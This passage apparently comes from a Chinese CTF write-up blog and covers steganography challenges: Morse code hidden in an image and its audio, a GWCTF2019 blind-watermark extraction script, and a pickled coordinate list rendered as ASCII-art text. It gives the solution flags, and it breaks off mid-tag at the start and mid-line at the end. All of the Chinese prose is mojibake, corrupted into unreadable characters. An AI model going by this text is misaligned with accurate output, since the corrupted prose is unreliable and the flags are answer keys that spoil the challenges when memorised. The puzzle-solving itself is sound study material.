alt="image-20210411151806582"></p><p>åœ¨å…¶å·¦ä¸‹è§’å¯ä»¥å‘ç°å°çº¢ç‚¹ï¼Œä½¿ç”¨æ‘©æ–¯ç”µç è§£ç å¯å¾— <code>HELPME</code>ã€‚åŒæ—¶åœ¨å›¾ç‰‡çš„æœ«å°¾è¿˜èƒ½å‘ç°ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618125682663/bc55fd1e1089fc806caa7e75db378b3ac9c87bc5.png"></p><p>å°†éŸ³é¢‘æ–‡ä»¶æå–å‡ºæ¥ï¼Œä½¿ç”¨ Audition æ‰“å¼€ï¼Œå¯ä»¥å‘ç°æ˜æ˜¾çš„æ‘©æ–¯ç”µç çš„ç—•è¿¹ï¼Œå°†å…¶æŠ„æ”¶ä¸‹æ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618126304818/1ae93647f541cffaa6a7baebcdf7a0f7a49e71e5.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.. -. ... .- -.--. -- ----- .-. ..... ...-- ..--.- .-- .---- .-.. .-.. ..--.- -. ...-- ...- ...-- .-. ..--.- ....- --. ...-- -.-.-- -.--.-</span><br></pre></td></tr></table></figure><p>è½¬ç åæ•´ç†å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;M0R53_W1LL_N3V3R_4G3!&#125;</span><br></pre></td></tr></table></figure><h3 id="GWCTF2019-huyao"><a href="#GWCTF2019-huyao" class="headerlink" title="[GWCTF2019]huyao"></a>[GWCTF2019]huyao</h3><p>é™„ä»¶ç»™å‡ºäº†ä¸¤å¼ å›¾ï¼ŒçŒœæµ‹æ˜¯ç›²æ°´å°ã€‚åœ¨ç½‘ä¸Šæ‰¾åˆ°ä¸€æ®µå¯è§£å‡ºçš„è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line">ALPHA = <span class="number">5</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_parser</span>():</span></span><br><span class="line">    parser = ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--original&#x27;</span>, dest=<span class="string">&#x27;ori&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--image&#x27;</span>, dest=<span class="string">&#x27;img&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--result&#x27;</span>, dest=<span class="string">&#x27;res&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--alpha&#x27;</span>, dest=<span class="string">&#x27;alpha&#x27;</span>, default=ALPHA)</span><br><span class="line">    <span class="keyword">return</span> parser</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = build_parser()</span><br><span class="line">    options = parser.parse_args()</span><br><span class="line">    ori = options.ori</span><br><span class="line">    img = options.img</span><br><span class="line">    res = options.res</span><br><span class="line">    alpha = options.alpha</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(ori):</span><br><span class="line">        parser.error(<span class="string">&quot;original image %s does not exist.&quot;</span> % ori)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(img):</span><br><span class="line">        parser.error(<span class="string">&quot;image %s does not exist.&quot;</span> % img)</span><br><span class="line">    decode(ori, img, res, alpha)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">ori_path, img_path, res_path, alpha</span>):</span></span><br><span class="line">    ori = cv2.imread(ori_path)</span><br><span class="line">    img = cv2.imread(img_path)</span><br><span class="line">    ori_f = np.fft.fft2(ori)</span><br><span class="line">    img_f = np.fft.fft2(img)</span><br><span class="line">    height, width = ori.shape[<span class="number">0</span>], ori.shape[<span class="number">1</span>]</span><br><span class="line">    watermark = (ori_f - img_f) / alpha</span><br><span class="line">    watermark = np.real(watermark)</span><br><span class="line">    res = np.zeros(watermark.shape)</span><br><span class="line">    random.seed(height + width)</span><br><span class="line">    x = <span class="built_in">range</span>(height / <span class="number">2</span>)</span><br><span class="line">    y = <span class="built_in">range</span>(width)</span><br><span class="line">    random.shuffle(x)</span><br><span class="line">    random.shuffle(y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height / <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            res[x[i]][y[j]] = watermark[i][j]</span><br><span class="line">    cv2.imwrite(res_path, res, [<span class="built_in">int</span>(cv2.IMWRITE_JPEG_QUALITY), <span class="number">100</span>])</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>python2 bwm.py --original huyao.png --image stillhuyao.png --result result.png</code> å¯ä»¥æå–å‡ºä¸€å¼ æ°´å°å›¾ï¼Œå› æ­¤å¾—åˆ°äº† flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618158119719/be262706bb8401ebe9d381f21def113d089ca311.png@270h_300w_1c"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GWHT&#123;BWM_1s_c00l&#125;</span><br></pre></td></tr></table></figure><h3 id="æˆ‘çˆ±Linux"><a href="#æˆ‘çˆ±Linux" class="headerlink" title="æˆ‘çˆ±Linux"></a>æˆ‘çˆ±Linux</h3><p>é™„ä»¶ç»™å‡ºçš„æ˜¯ä¸€å¼ å›¾ç‰‡ã€‚åœ¨å…¶æœ«å°¾å¯ä»¥å¾—åˆ°ä¸€ä¸²äºŒè¿›åˆ¶æ•°æ®ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618491407832/94cc2c15890475c424c7921d58468849a9bab35d.png"></p><p>ä½¿ç”¨ <code>print(pickle.loads(open(&quot;extract.bin&quot;, &quot;rb&quot;).read()))</code> å¤„ç†ä¸€ä¸‹å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[(3, &#39;m&#39;), (4, &#39;&quot;&#39;), (5, &#39;&quot;&#39;), (8, &#39;&quot;&#39;), (9, &#39;&quot;&#39;), (10, &#39;#&#39;), (31, &#39;m&#39;), (32, &#39;&quot;&#39;), (33, &#39;&quot;&#39;), (44, &#39;m&#39;), (45, &#39;m&#39;), (46, &#39;m&#39;), (47, &#39;m&#39;), (50, &#39;m&#39;), (51, &#39;m&#39;), (52, &#39;m&#39;), (53, &#39;m&#39;), (54, &#39;m&#39;), (55, &#39;m&#39;), (58, &#39;m&#39;), (59, &#39;m&#39;), (60, &#39;m&#39;), (61, &#39;m&#39;), (66, &#39;m&#39;), (67, &#39;&quot;&#39;), (68, &#39;&quot;&#39;), (75, &#39;#&#39;)], [(1, &#39;m&#39;), (2, &#39;m&#39;), (3, &#39;#&#39;), (4, &#39;m&#39;), (5, &#39;m&#39;), (10, &#39;#&#39;), (16, &#39;m&#39;), (17, &#39;m&#39;), (18, &#39;m&#39;), (23, &#39;m&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;m&#39;), (31, &#39;#&#39;), (37, &#39;m&#39;), (38, &#39;m&#39;), (39, &#39;m&#39;), (43, &#39;&quot;&#39;), (47, &#39;&quot;&#39;), (48, &#39;#&#39;), (54, &#39;#&#39;), (55, &#39;&quot;&#39;), (57, &#39;&quot;&#39;), (61, &#39;&quot;&#39;), (62, &#39;#&#39;), (64, &#39;m&#39;), (65, &#39;m&#39;), (66, &#39;#&#39;), (67, &#39;m&#39;), (68, &#39;m&#39;), (72, &#39;m&#39;), (73, &#39;m&#39;), (74, &#39;m&#39;), (75, &#39;#&#39;)], [(3, &#39;#&#39;), (10, &#39;#&#39;), (15, &#39;&quot;&#39;), (19, &#39;#&#39;), (22, &#39;#&#39;), (23, &#39;&quot;&#39;), (25, &#39;&quot;&#39;), (26, &#39;#&#39;), (29, &#39;m&#39;), (30, &#39;m&#39;), (31, &#39;&quot;&#39;), (36, &#39;&quot;&#39;), (40, &#39;#&#39;), (47, &#39;m&#39;), (48, &#39;&quot;&#39;), (53, &#39;m&#39;), (54, &#39;&quot;&#39;), (59, &#39;m&#39;), (60, &#39;m&#39;), (61, &#39;m&#39;), (62, &#39;&quot;&#39;), (66, &#39;#&#39;), (71, &#39;#&#39;), (72, &#39;&quot;&#39;), (74, &#39;&quot;&#39;), (75, &#39;#&#39;)], [(3, &#39;#&#39;), (10, &#39;#&#39;), (15, &#39;m&#39;), (16, &#39;&quot;&#39;), (17, &#39;&quot;&#39;), (18, &#39;&quot;&#39;), (19, &#39;#&#39;), (22, &#39;#&#39;), (26, &#39;#&#39;), (31, &#39;#&#39;), (36, &#39;m&#39;), (37, &#39;&quot;&#39;), (38, &#39;&quot;&#39;), (39, &#39;&quot;&#39;), (40, &#39;#&#39;), (45, &#39;m&#39;), (46, &#39;&quot;&#39;), (52, &#39;m&#39;), (53, &#39;&quot;&#39;), (61, &#39;&quot;&#39;), (62, &#39;#&#39;), (66, &#39;#&#39;), (71, &#39;#&#39;), (75, &#39;#&#39;)], [(3, &#39;#&#39;), (10, &#39;&quot;&#39;), (11, &#39;m&#39;), (12, &#39;m&#39;), (15, &#39;&quot;&#39;), (16, &#39;m&#39;), (17, &#39;m&#39;), (18, &#39;&quot;&#39;), (19, &#39;#&#39;), (22, &#39;&quot;&#39;), (23, &#39;#&#39;), (24, &#39;m&#39;), (25, &#39;&quot;&#39;), (26, &#39;#&#39;), (31, &#39;#&#39;), (36, &#39;&quot;&#39;), (37, &#39;m&#39;), (38, &#39;m&#39;), (39, &#39;&quot;&#39;), (40, &#39;#&#39;), (43, &#39;m&#39;), (44, &#39;#&#39;), (45, &#39;m&#39;), (46, &#39;m&#39;), (47, &#39;m&#39;), (48, &#39;m&#39;), (51, &#39;m&#39;), (52, &#39;&quot;&#39;), (57, &#39;&quot;&#39;), (58, &#39;m&#39;), (59, &#39;m&#39;), (60, &#39;m&#39;), (61, &#39;#&#39;), (62, &#39;&quot;&#39;), (66, &#39;#&#39;), (71, &#39;&quot;&#39;), (72, &#39;#&#39;), (73, &#39;m&#39;), (74, &#39;#&#39;), (75, &#39;#&#39;)], [(23, &#39;m&#39;), (26, &#39;#&#39;), (32, &#39;&quot;&#39;), (33, &#39;&quot;&#39;)], [(24, &#39;&quot;&#39;), (25, &#39;&quot;&#39;)], [], [(12, &#39;#&#39;), (17, &#39;m&#39;), (18, &#39;&quot;&#39;), (19, &#39;&quot;&#39;), (23, &#39;m&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;m&#39;), (33, &#39;#&#39;), (36, &#39;m&#39;), (37, &#39;m&#39;), (38, &#39;m&#39;), (39, &#39;m&#39;), (40, &#39;m&#39;), (41, &#39;m&#39;), (46, &#39;m&#39;), (47, &#39;m&#39;), (52, &#39;m&#39;), (53, &#39;m&#39;), (54, &#39;m&#39;), (65, &#39;m&#39;), (66, &#39;m&#39;), (67, &#39;m&#39;), (68, &#39;m&#39;), (71, &#39;m&#39;), (72, &#39;m&#39;), (73, &#39;m&#39;), (74, &#39;m&#39;), (75, &#39;m&#39;), (76, &#39;m&#39;)], [(2, &#39;m&#39;), (3, &#39;m&#39;), (4, &#39;m&#39;), (9, &#39;m&#39;), (10, &#39;m&#39;), (11, &#39;m&#39;), (12, &#39;#&#39;), (15, &#39;m&#39;), (16, &#39;m&#39;), (17, &#39;#&#39;), (18, &#39;m&#39;), (19, &#39;m&#39;), (22, &#39;&quot;&#39;), (26, &#39;&quot;&#39;), (27, &#39;#&#39;), (30, &#39;m&#39;), (31, &#39;m&#39;), (32, &#39;m&#39;), (33, &#39;#&#39;), (40, &#39;#&#39;), (41, &#39;&quot;&#39;), (45, &#39;m&#39;), (46, &#39;&quot;&#39;), (47, &#39;#&#39;), (50, &#39;m&#39;), (51, &#39;&quot;&#39;), (55, &#39;&quot;&#39;), (58, &#39;m&#39;), (59, &#39;m&#39;), (60, &#39;m&#39;), (64, &#39;#&#39;), (65, &#39;&quot;&#39;), (68, &#39;&quot;&#39;), (69, &#39;m&#39;), (75, &#39;#&#39;), (76, &#39;&quot;&#39;)], [(1, &#39;#&#39;), (2, &#39;&quot;&#39;), (5, &#39;#&#39;), (8, &#39;#&#39;), (9, &#39;&quot;&#39;), (11, &#39;&quot;&#39;), (12, &#39;#&#39;), (17, &#39;#&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;m&#39;), (27, &#39;&quot;&#39;), (29, &#39;#&#39;), (30, &#39;&quot;&#39;), (32, &#39;&quot;&#39;), (33, &#39;#&#39;), (39, &#39;m&#39;), (40, &#39;&quot;&#39;), (44, &#39;#&#39;), (45, &#39;&quot;&#39;), (47, &#39;#&#39;), (50, &#39;#&#39;), (51, &#39;m&#39;), (52, &#39;&quot;&#39;), (53, &#39;&quot;&#39;), (54, &#39;#&#39;), (55, &#39;m&#39;), (57, &#39;#&#39;), (58, &#39;&quot;&#39;), (61, &#39;#&#39;), (64, &#39;#&#39;), (65, &#39;m&#39;), (68, &#39;m&#39;), (69, &#39;#&#39;), (74, &#39;m&#39;), (75, &#39;&quot;&#39;)], [(1, &#39;#&#39;), (2, &#39;&quot;&#39;), (3, &#39;&quot;&#39;), (4, &#39;&quot;&#39;), (5, &#39;&quot;&#39;), (8, &#39;#&#39;), (12, &#39;#&#39;), (17, &#39;#&#39;), (26, &#39;&quot;&#39;), (27, &#39;#&#39;), (29, &#39;#&#39;), (33, &#39;#&#39;), (38, &#39;m&#39;), (39, &#39;&quot;&#39;), (43, &#39;#&#39;), (44, &#39;m&#39;), (45, &#39;m&#39;), (46, &#39;m&#39;), (47, &#39;#&#39;), (48, &#39;m&#39;), (50, &#39;#&#39;), (55, &#39;#&#39;), (57, &#39;#&#39;), (58, &#39;&quot;&#39;), (59, &#39;&quot;&#39;), (60, &#39;&quot;&#39;), (61, &#39;&quot;&#39;), (65, &#39;&quot;&#39;), (66, &#39;&quot;&#39;), (67, &#39;&quot;&#39;), (69, &#39;#&#39;), (73, &#39;m&#39;), (74, &#39;&quot;&#39;)], [(1, &#39;&quot;&#39;), (2, &#39;#&#39;), (3, &#39;m&#39;), (4, &#39;m&#39;), (5, &#39;&quot;&#39;), (8, &#39;&quot;&#39;), (9, &#39;#&#39;), (10, &#39;m&#39;), (11, &#39;#&#39;), (12, &#39;#&#39;), (17, &#39;#&#39;), (22, &#39;&quot;&#39;), (23, &#39;m&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;#&#39;), (27, &#39;&quot;&#39;), (29, &#39;&quot;&#39;), (30, &#39;#&#39;), (31, &#39;m&#39;), (32, &#39;#&#39;), (33, &#39;#&#39;), (37, &#39;m&#39;), (38, &#39;&quot;&#39;), (47, &#39;#&#39;), (51, &#39;#&#39;), (52, &#39;m&#39;), (53, &#39;m&#39;), (54, &#39;#&#39;), (55, &#39;&quot;&#39;), (57, &#39;&quot;&#39;), (58, &#39;#&#39;), (59, &#39;m&#39;), (60, &#39;m&#39;), (61, &#39;&quot;&#39;), (64, &#39;&quot;&#39;), (65, &#39;m&#39;), (66, &#39;m&#39;), (67, &#39;m&#39;), (68, &#39;&quot;&#39;), (72, &#39;m&#39;), (73, &#39;&quot;&#39;)], [], [], [], [(5, &#39;#&#39;), (8, &#39;#&#39;), (16, &#39;m&#39;), (17, &#39;m&#39;), (18, &#39;m&#39;), (19, &#39;m&#39;), (23, &#39;m&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;m&#39;), (30, &#39;m&#39;), (31, &#39;m&#39;), (32, &#39;m&#39;), (33, &#39;m&#39;), (38, &#39;m&#39;), (39, &#39;m&#39;), (40, &#39;m&#39;), (50, &#39;#&#39;), (57, &#39;#&#39;), (64, &#39;#&#39;), (71, &#39;m&#39;), (72, &#39;m&#39;), (73, &#39;m&#39;)], [(2, &#39;m&#39;), (3, &#39;m&#39;), (4, &#39;m&#39;), (5, &#39;#&#39;), (8, &#39;#&#39;), (9, &#39;m&#39;), (10, &#39;m&#39;), (11, &#39;m&#39;), (15, &#39;#&#39;), (16, &#39;&quot;&#39;), (19, &#39;&quot;&#39;), (20, &#39;m&#39;), (22, &#39;m&#39;), (23, &#39;&quot;&#39;), (26, &#39;&quot;&#39;), (27, &#39;m&#39;), (29, &#39;#&#39;), (34, &#39;#&#39;), (36, &#39;m&#39;), (37, &#39;&quot;&#39;), (41, &#39;&quot;&#39;), (44, &#39;m&#39;), (45, &#39;m&#39;), (46, &#39;m&#39;), (50, &#39;#&#39;), (51, &#39;m&#39;), (52, &#39;m&#39;), (53, &#39;m&#39;), (57, &#39;#&#39;), (58, &#39;m&#39;), (59, &#39;m&#39;), (60, &#39;m&#39;), (64, &#39;#&#39;), (65, &#39;m&#39;), (66, &#39;m&#39;), (67, &#39;m&#39;), (73, &#39;#&#39;)], [(1, &#39;#&#39;), (2, &#39;&quot;&#39;), (4, &#39;&quot;&#39;), (5, &#39;#&#39;), (8, &#39;#&#39;), (9, &#39;&quot;&#39;), (11, &#39;&quot;&#39;), (12, &#39;#&#39;), (15, &#39;#&#39;), (16, &#39;m&#39;), (19, &#39;m&#39;), (20, &#39;#&#39;), (22, &#39;#&#39;), (25, &#39;m&#39;), (27, &#39;#&#39;), (29, &#39;&quot;&#39;), (30, &#39;m&#39;), (31, &#39;m&#39;), (32, &#39;m&#39;), (33, &#39;m&#39;), (34, &#39;&quot;&#39;), (36, &#39;#&#39;), (37, &#39;m&#39;), (38, &#39;&quot;&#39;), (39, &#39;&quot;&#39;), (40, &#39;#&#39;), (41, &#39;m&#39;), (43, &#39;#&#39;), (44, &#39;&quot;&#39;), (47, &#39;#&#39;), (50, &#39;#&#39;), (51, &#39;&quot;&#39;), (53, &#39;&quot;&#39;), (54, &#39;#&#39;), (57, &#39;#&#39;), (58, &#39;&quot;&#39;), (60, &#39;&quot;&#39;), (61, &#39;#&#39;), (64, &#39;#&#39;), (65, &#39;&quot;&#39;), (67, &#39;&quot;&#39;), (68, &#39;#&#39;), (73, &#39;#&#39;)], [(1, &#39;#&#39;), (5, &#39;#&#39;), (8, &#39;#&#39;), (12, &#39;#&#39;), (16, &#39;&quot;&#39;), (17, &#39;&quot;&#39;), (18, &#39;&quot;&#39;), (20, &#39;#&#39;), (22, &#39;#&#39;), (27, &#39;#&#39;), (29, &#39;#&#39;), (33, &#39;&quot;&#39;), (34, &#39;#&#39;), (36, &#39;#&#39;), (41, &#39;#&#39;), (43, &#39;#&#39;), (44, &#39;&quot;&#39;), (45, &#39;&quot;&#39;), (46, &#39;&quot;&#39;), (47, &#39;&quot;&#39;), (50, &#39;#&#39;), (54, &#39;#&#39;), (57, &#39;#&#39;), (61, &#39;#&#39;), (64, &#39;#&#39;), (68, &#39;#&#39;), (73, &#39;#&#39;)], [(1, &#39;&quot;&#39;), (2, &#39;#&#39;), (3, &#39;m&#39;), (4, &#39;#&#39;), (5, &#39;#&#39;), (8, &#39;#&#39;), (9, &#39;#&#39;), (10, &#39;m&#39;), (11, &#39;#&#39;), (12, &#39;&quot;&#39;), (15, &#39;&quot;&#39;), (16, &#39;m&#39;), (17, &#39;m&#39;), (18, &#39;m&#39;), (19, &#39;&quot;&#39;), (23, &#39;#&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;#&#39;), (29, &#39;&quot;&#39;), (30, &#39;#&#39;), (31, &#39;m&#39;), (32, &#39;m&#39;), (33, &#39;m&#39;), (34, &#39;&quot;&#39;), (37, &#39;#&#39;), (38, &#39;m&#39;), (39, &#39;m&#39;), (40, &#39;#&#39;), (41, &#39;&quot;&#39;), (43, &#39;&quot;&#39;), (44, &#39;#&#39;), (45, &#39;m&#39;), (46, &#39;m&#39;), (47, &#39;&quot;&#39;), (50, &#39;#&#39;), (51, &#39;#&#39;), (52, &#39;m&#39;), (53, &#39;#&#39;), (54, &#39;&quot;&#39;), (57, &#39;#&#39;), (58, &#39;#&#39;), (59, &#39;m&#39;), (60, &#39;#&#39;), (61, &#39;&quot;&#39;), (64, &#39;#&#39;), (65, &#39;#&#39;), (66, &#39;m&#39;), (67, &#39;#&#39;), (68, &#39;&quot;&#39;), (71, &#39;m&#39;), (72, &#39;m&#39;), (73, &#39;#&#39;), (74, &#39;m&#39;), (75, &#39;m&#39;)], [], [], [], [(2, &#39;m&#39;), (3, &#39;m&#39;), (4, &#39;m&#39;), (5, &#39;m&#39;), (8, &#39;m&#39;), (9, &#39;m&#39;), (10, &#39;m&#39;), (11, &#39;m&#39;), (12, &#39;m&#39;), (19, &#39;#&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;m&#39;), (29, &#39;&quot;&#39;), (30, &#39;&quot;&#39;), (31, &#39;m&#39;)], [(1, &#39;#&#39;), (2, &#39;&quot;&#39;), (5, &#39;&quot;&#39;), (6, &#39;m&#39;), (8, &#39;#&#39;), (16, &#39;m&#39;), (17, &#39;m&#39;), (18, &#39;m&#39;), (19, &#39;#&#39;), (22, &#39;m&#39;), (23, &#39;&quot;&#39;), (27, &#39;&quot;&#39;), (31, &#39;#&#39;)], [(1, &#39;#&#39;), (2, &#39;m&#39;), (5, &#39;m&#39;), (6, &#39;#&#39;), (8, &#39;&quot;&#39;), (9, &#39;&quot;&#39;), (10, &#39;&quot;&#39;), (11, &#39;&quot;&#39;), (12, &#39;m&#39;), (13, &#39;m&#39;), (15, &#39;#&#39;), (16, &#39;&quot;&#39;), (18, &#39;&quot;&#39;), (19, &#39;#&#39;), (22, &#39;#&#39;), (23, &#39;m&#39;), (24, &#39;&quot;&#39;), (25, &#39;&quot;&#39;), (26, &#39;#&#39;), (27, &#39;m&#39;), (31, &#39;&quot;&#39;), (32, &#39;m&#39;), (33, &#39;m&#39;)], [(2, &#39;&quot;&#39;), (3, &#39;&quot;&#39;), (4, &#39;&quot;&#39;), (6, &#39;#&#39;), (13, &#39;#&#39;), (15, &#39;#&#39;), (19, &#39;#&#39;), (22, &#39;#&#39;), (27, &#39;#&#39;), (31, &#39;#&#39;)], [(1, &#39;&quot;&#39;), (2, &#39;m&#39;), (3, &#39;m&#39;), (4, &#39;m&#39;), (5, &#39;&quot;&#39;), (8, &#39;&quot;&#39;), (9, &#39;m&#39;), (10, &#39;m&#39;), (11, &#39;m&#39;), (12, &#39;#&#39;), (13, &#39;&quot;&#39;), (15, &#39;&quot;&#39;), (16, &#39;#&#39;), (17, &#39;m&#39;), (18, &#39;#&#39;), (19, &#39;#&#39;), (23, &#39;#&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;#&#39;), (27, &#39;&quot;&#39;), (31, &#39;#&#39;)], [(29, &#39;&quot;&#39;), (30, &#39;&quot;&#39;)]]</span><br></pre></td></tr></table></figure><p>å‘ç°å…¶å¥½åƒæ˜¯åæ ‡å¯¹åº”å¾—å…³ç³»ï¼Œäºæ˜¯å†™ä¸ªè„šæœ¬å°†å…¶å¯¹åº”å‡ºæ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">contents = <span class="built_in">list</span>(pickle.loads(<span class="built_in">open</span>(<span class="string">&quot;extract.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()))</span><br><span class="line"><span class="keyword">for</span> content <span class="keyword">in</span> contents:</span><br><span class="line">    line = <span class="built_in">list</span>(<span class="string">&quot;                                                                             &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> (x, y) <span class="keyword">in</span> content:</span><br><span class="line">        line[x] = y</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(line).replace(<span class="string">&quot;\&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;, &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;[&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  m&quot;&quot;  &quot;&quot;#                    m&quot;&quot;          mmmm  mmmmmm  mmmm    m&quot;&quot;      # </span><br><span class="line">mm#mm    #     mmm    mmmm    #     mmm   &quot;   &quot;#     #&quot; &quot;   &quot;# mm#mm   mmm# </span><br><span class="line">  #      #    &quot;   #  #&quot; &quot;#  mm&quot;    &quot;   #      m&quot;    m&quot;    mmm&quot;   #    #&quot; &quot;# </span><br><span class="line">  #      #    m&quot;&quot;&quot;#  #   #    #    m&quot;&quot;&quot;#    m&quot;     m&quot;       &quot;#   #    #   # </span><br><span class="line">  #      &quot;mm  &quot;mm&quot;#  &quot;#m&quot;#    #    &quot;mm&quot;#  m#mmmm  m&quot;    &quot;mmm#&quot;   #    &quot;#m## </span><br><span class="line">                      m  #     &quot;&quot;                                           </span><br><span class="line">                       &quot;&quot;                                                   </span><br><span class="line">                                                                            </span><br><span class="line">           #    m&quot;&quot;   mmmm      #  mmmmmm    mm    mmm          mmmm  mmmmmm</span><br><span class="line"> mmm    mmm#  mm#mm  &quot;   &quot;#  mmm#      #&quot;   m&quot;#  m&quot;   &quot;  mmm   #&quot;  &quot;m     #&quot;</span><br><span class="line">#&quot;  #  #&quot; &quot;#    #      mmm&quot; #&quot; &quot;#     m&quot;   #&quot; #  #m&quot;&quot;#m #&quot;  #  #m  m#    m&quot; </span><br><span class="line">#&quot;&quot;&quot;&quot;  #   #    #        &quot;# #   #    m&quot;   #mmm#m #    # #&quot;&quot;&quot;&quot;   &quot;&quot;&quot; #   m&quot;  </span><br><span class="line">&quot;#mm&quot;  &quot;#m##    #    &quot;mmm#&quot; &quot;#m##   m&quot;        #   #mm#&quot; &quot;#mm&quot;  &quot;mmm&quot;   m&quot;   </span><br><span class="line">                                                                            </span><br><span class="line">                                                                            </span><br><span class="line">                                                                            </span><br><span class="line">    #  #       mmmm   mmmm   mmmm    mmm         #      #      #      mmm   </span><br><span class="line"> mmm#  #mmm   #&quot;  &quot;m m&quot;  &quot;m #    # m&quot;   &quot;  mmm   #mmm   #mmm   #mmm     #   </span><br><span class="line">#&quot; &quot;#  #&quot; &quot;#  #m  m# #  m # 